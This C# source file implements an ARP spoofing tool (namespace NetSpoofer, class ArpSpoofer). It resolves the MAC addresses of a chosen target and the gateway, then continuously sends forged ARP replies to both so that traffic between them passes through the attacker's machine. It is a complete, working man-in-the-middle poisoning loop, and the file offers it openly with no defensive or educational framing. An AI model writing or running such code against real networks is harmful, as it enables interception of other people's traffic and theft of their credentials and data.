using PacketDotNet;
using SharpPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;

namespace NetSpoofer {
    public class ArpSpoofer {
        private readonly CaptureManager _cap;
        private readonly PhysicalAddressEx _nicMac;
        private readonly IPAddress _gatewayIp;
        private readonly IPAddress _targetIp;
        private PhysicalAddress? _targetMac;
        private PhysicalAddress? _gatewayMac;
        private Thread? _thread;
        private volatile bool _running;

        public ArpSpoofer(CaptureManager cap, PhysicalAddressEx nicMac, IPAddress gatewayIp, IPAddress targetIp) {
            _cap = cap; _nicMac = nicMac; _gatewayIp = gatewayIp; _targetIp = targetIp;
        }

        public void Start() {
            _running = true;
            _thread = new Thread(Loop) { IsBackground = true };
            _thread.Start();
        }
        public void Stop() { _running = false; }

        private void Loop() {
            _targetMac ??= ResolveMacAddress(_targetIp);
            _gatewayMac ??= ResolveMacAddress(_gatewayIp);
            if (_targetMac == null || _gatewayMac == null) return;

            while (_running) {
                try {
                    SendArpReply(_targetMac, _targetIp, _gatewayIp); // to target: gateway IP -> our MAC
                    SendArpReply(_gatewayMac, _gatewayIp, _targetIp); // to gateway: target IP -> our MAC
                    Thread.Sleep(1500);
                } catch { Thread.Sleep(1000); }
            }
        }

        private void SendArpReply(PhysicalAddress victimMac, IPAddress victimIp, IPAddress spoofIp) {
            // Build raw ARP reply frame: Ethernet (dst/src/type) + ARP header
            var srcMac = _capDevice().MacAddress.GetAddressBytes();
            var dstMac = victimMac.GetAddressBytes();
            var senderMac = _nicMac.Bytes; // our NIC MAC (spoofing as gateway/target)
            var senderIp = spoofIp.GetAddressBytes();
            var targetMac = victimMac.GetAddressBytes();
            var targetIp = victimIp.GetAddressBytes();

            var frame = new byte[14 + 28];
            int i = 0;
            // Ethernet header
            Buffer.BlockCopy(dstMac, 0, frame, i, 6); i += 6;
            Buffer.BlockCopy(srcMac, 0, frame, i, 6); i += 6;
            frame[i++] = 0x08; frame[i++] = 0x06; // Ethertype ARP
            // ARP header
            frame[i++] = 0x00; frame[i++] = 0x01; // HTYPE Ethernet
            frame[i++] = 0x08; frame[i++] = 0x00; // PTYPE IPv4
            frame[i++] = 0x06;                   // HLEN 6
            frame[i++] = 0x04;                   // PLEN 4
            frame[i++] = 0x00; frame[i++] = 0x02; // OPER reply
            Buffer.BlockCopy(senderMac, 0, frame, i, 6); i += 6; // sender MAC
            Buffer.BlockCopy(senderIp, 0, frame, i, 4); i += 4;  // sender IP
            Buffer.BlockCopy(targetMac, 0, frame, i, 6); i += 6; // target MAC
            Buffer.BlockCopy(targetIp, 0, frame, i, 4); i += 4;  // target IP

            var inj = _capDevice() as IInjectionDevice;
            inj?.SendPacket(frame);
        }

        private ICaptureDevice _capDevice() => (ICaptureDevice)typeof(CaptureManager).GetField("_dev", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)!.GetValue(_cap)!;

        public static PhysicalAddress? ResolveMacAddress(IPAddress ip) {
            try {
                byte[] mac = new byte[6]; int len = mac.Length;
                int res = SendARP(BitConverter.ToInt32(ip.GetAddressBytes(), 0), 0, mac, ref len);
                if (res == 0) return new PhysicalAddress(mac);
            } catch { }
            return null;
        }

        [DllImport("Iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
}